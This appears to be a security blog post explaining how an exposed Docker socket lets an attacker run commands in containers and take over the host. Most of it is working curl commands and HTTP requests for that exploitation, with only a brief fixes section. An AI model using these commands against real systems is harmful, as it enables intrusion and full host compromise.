---
layout: post
title: "The Danger of Exposing Docker.Sock"
date: 2019-04-11 12:00:00
image: '/assets/img/docker/docker_sock.png'
description: "Exposing /var/run/docker.sock could lead to full environment takeover."
tags: docker
categories: docker, vulnerability
twitter_text: "Thousands of servers on the internet could be vulnerable to full environment takeover with this common misconfiguration with the docker.sock file."
---
<img align="right" src="/assets/img/docker/docker_sock.png">

By default, when the `docker` command is executed on a host, an API call to the docker daemon is made via a non-networked UNIX socket located at `/var/run/docker.sock`. This socket file is the main API to control any of the docker containers running on that host. However, many containers and guides require you to expose this socket file as a volume within a container<a href="https://docs.traefik.io/#1-launch-traefik-tell-it-to-listen-to-docker"><sup>[1]</sup></a><a href="https://www.portainer.io/installation/"><sup>[2]</sup></a><a href="https://elastest.io/docs/deploying/ubuntu/"><sup>[3]</sup></a><a href="https://vamp.io/documentation/installation/v0.9.5/hello-world/"><sup>[4]</sup></a><a href="https://github.com/containrrr/watchtower"><sup>[5]</sup></a><a href="https://github.com/spotify/docker-gc#running-as-a-docker-container"><sup>[6]</sup></a> or in some cases, expose it on a TCP port<a href="https://www.ivankrizsan.se/2016/05/18/enabling-docker-remote-api-on-ubuntu-16-04/"><sup>[1]</sup></a><a href="https://success.docker.com/article/how-do-i-enable-the-remote-api-for-dockerd"><sup>[2]</sup></a><a href="https://medium.com/@ssmak/how-to-enable-docker-remote-api-on-docker-host-7b73bd3278c6"><sup>[3]</sup></a>. Docker containers that expose `/var/run/docker.sock`, locally or remotely, could lead to a full environment take over. 

I've already found a large number of servers that expose docker.sock to the internet.

This vulnerability isn't a new idea, the danger of exposing the `docker.sock` file have been [talked about before](https://www.lvh.io/posts/dont-expose-the-docker-socket-not-even-to-a-container.html). However, my post will expand on the issue, explain how to take advantage of it, and what you can do to fix it. If you follow me on [twitter](https://twitter.com/dejandayoff) I'll  share a script soon that I made to make exploiting this even easier.

# What can you do with it?
Exploiting a exposed docker.sock file allows you to do pretty much anything you want with any of the containers that run on the host. Access to the `docker.sock` file, locally or remotely, allows you to control docker as if you were on the host itself running docker commands.

The simplest example of this is exploiting access to the `docker.sock` file via the official docker client. This can occur if you happen to get access to a container with the docker client already installed or if you have the ability to install the docker client. To exploit this, you can simply run regular docker commands including exec to get shell:

```
root@9e50daaea94f:/# ls -alh /var/run/docker.sock #checking if socket is availible
srw-rw---- 1 root 999 0 Apr  4 02:00 /var/run/docker.sock

root@9e50daaea94f:/# hostname
9e50daaea94f

root@9e50daaea94f:/# docker container ls
CONTAINER ID        NAMES
509eebf873fb        another_container
9e50daaea94f        current_container

root@9e50daaea94f:/# docker exec -it another_container bash #running bash on the other container

root@509eebf873fb:/# hostname
509eebf873fb
```

However, to run this, you have to already have RCE on a container. Even with RCE, most of the time you will not have access to a docker client and installing a docker client might not be possible. If this is the case, you can make raw http requests to `/var/run/docker.sock`. 

While it is possible to exploit a docker environment with RCE on a docker container by making HTTP requests to the `docker.sock` file, it is an unlikely situation. The more likely situation is finding the `docker.sock` file exposed remotely via a TCP Port. In my examples on how to exploit this misconfiguration, I'll post the raw HTTP request and curl commands for remote exploitation. I'll have an appendix section that will list the equivalent curl commands to run for exploiting local environments.

If you need to run any commands that I don't list below, the docker API is [very well documented](https://docs.docker.com/engine/api/v1.37/)

[Click here](https://console.aws.amazon.com/cloudformation/home?region=us-west-2#/stacks/new?stackName=DockerSock&templateURL=https://s3-us-west-2.amazonaws.com/cf-templates-1hvupoi2etj4x-us-west-2/2019101XTh-docker.sock.template3tlnn4nypxg) if you want to follow along. This is a CloudFormation script. You will need to have an AWS account with permissions to start a new EC2 instance. Don't forget to delete the stack after you are done!

## Getting RCE on a Container

### 1) List all containers
The first step is to get a list of all containers on the host. To do this, the following http request will need to be executed:

```
GET /containers/json HTTP/1.1
Host: <docker_host>:PORT
```
Curl command:

```
curl -i -s -X GET http://<docker_host>:PORT/containers/json
```

**Expected response:**

```
HTTP/1.1 200 OK
Api-Version: 1.39
Content-Type: application/json
Docker-Experimental: false
Ostype: linux
Server: Docker/18.09.4 (linux)
Date: Thu, 04 Apr 2019 05:56:03 GMT
Content-Length: 1780

[
    {
        "Id":"a4621ceab3729702f18cfe852003489341e51e036d13317d8e7016facb8ebbaf",
        "Names":["/another_container"],
        "Image":"ubuntu:latest",
        "ImageID":"sha256:94e814e2efa8845d95b2112d54497fbad173e45121ce9255b93401392f538499",
        "Command":"bash",
        "Created":1554357359,
        "Ports":[],
        "Labels":{},
        "State":"running",
        "Status":"Up 3 seconds",
        "HostConfig":{"NetworkMode":"default"},
        "NetworkSettings":{"Networks": 
        ...
```

*From the response take note of the "Id" field as the next commands will use them.*

### 2) Create an exec
Next, we will need to create a "exec" instance that will be executed on the container. This is where you will input the command you want to run.

The following items in the request will need to be changed in the request: 

 - Container ID
 - Docker Host
 - Port
 - Cmd (my example will cat out /etc/passwd)

```
POST /containers/<container_id>/exec HTTP/1.1
Host: <docker_host>:PORT
Content-Type: application/json
Content-Length: 188

{
  "AttachStdin": true,
  "AttachStdout": true,
  "AttachStderr": true,
  "Cmd": ["cat", "/etc/passwd"],
  "DetachKeys": "ctrl-p,ctrl-q",
  "Privileged": true,
  "Tty": true
}
```

Curl command:

```
curl -i -s -X POST \
-H "Content-Type: application/json" \
--data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/etc/passwd"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' \
http://<docker_host>:PORT/containers/<container_id>/exec
```

**Expected Response:**

```
HTTP/1.1 201 Created
Api-Version: 1.39
Content-Type: application/json
Docker-Experimental: false
Ostype: linux
Server: Docker/18.09.4 (linux)
Date: Fri, 05 Apr 2019 00:51:31 GMT
Content-Length: 74

{"Id":"8b5e4c65e182cec039d38ddb9c0a931bbba8f689a4b3e1be1b3e8276dd2d1916"}
```

*From the response take note of the "Id" field as the next commands will use them.*

### 3) Start the exec
Now that the "exec" is created, we need to run it. 

The following items in the request will need to be changed: 

 - Exec ID (from the last command)
 - Docker Host
 - Port

```
POST /exec/<exec_id>/start HTTP/1.1
Host: <docker_host>:PORT
Content-Type: application/json

{
 "Detach": false,
 "Tty": false
}
```

Curl command:

```
curl -i -s -X POST \
-H 'Content-Type: application/json' \
--data-binary '{"Detach": false,"Tty": false}' \
http://<docker_host>:PORT/exec/<exec_id>/start
```

**Expected Response:**

```
HTTP/1.1 200 OK
Content-Type: application/vnd.docker.raw-stream
Api-Version: 1.39
Docker-Experimental: false
Ostype: linux
Server: Docker/18.09.4 (linux)

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

Seeing the nice delimited format of `/etc/passwd` is beautiful, isn't it? Well I'm sure to the people who are vulnerable it isn't but to us, it is.

## Bonus: Take over the host
Starting a docker container with the root of the host mounted to a volume on the container will allow commands to be executed against the host's filesystem. Since the vulnerability discussed in this post allows you to have full control of the API, it is possible to take control of the docker host. I won't get into the crazy details, but here are the curl commands to do this:

*Note: don't forget to change the docker_host, port, and container_ID (where applicable)*

**1) Download the ubuntu image** 

```
curl -i -s -k  -X 'POST' \
-H 'Content-Type: application/json' \
http://<docker_host>:PORT/images/create?fromImage=ubuntu&tag=latest
```

**2) Create the container with the mounted volume** 

```
curl -i -s -k  -X 'POST' \
-H 'Content-Type: application/json' \
--data-binary '{"Hostname": "","Domainname": "","User": "","AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Tty": true,"OpenStdin": true,"StdinOnce": true,"Entrypoint": "/bin/bash","Image": "ubuntu","Volumes": {"/hostos/": {}},"HostConfig": {"Binds": ["/:/hostos"]}}' \
http://<docker_host>:PORT/containers/create
```

**3) Start the container** 

```
curl -i -s -k  -X 'POST' \
-H 'Content-Type: application/json' \
http://<docker_host>:PORT/containers/<container_ID>/start
```

From here, use the code execution vulnerability discussed above to run commands against the new container. Don't forget to add `chroot /hostos` if you want to run the command against the Host OS.
 
# How do I fix this?

 1. Avoid making docker.sock available remotely or at the container level at all costs (If possible).
    
 2. Follow [this](https://docs.docker.com/engine/security/https/) if you absolutely need to make the socket file remotely available

 3. Set up proper security groups and firewall rules to block access from IPs that do not need access.

# Appendix
## Local Commands
Here is a list of curl commands to run if the API is not available remotely but is available locally.
### 1) List all containers

```
sudo curl -i -s --unix-socket /var/run/docker.sock -X GET \
http://localhost/containers/json
```

### 2) Create an exec

```
sudo curl -i -s --unix-socket /var/run/docker.sock -X POST \
-H "Content-Type: application/json" \
--data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/etc/passwd"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' \
http://localhost/containers/<container_id>/exec
```

### 3) Start the exec

```
sudo curl -i -s --unix-socket /var/run/docker.sock -X POST \
-H 'Content-Type: application/json' \
--data-binary '{"Detach": false,"Tty": false}' \
http://localhost/exec/<exec_id>/start
```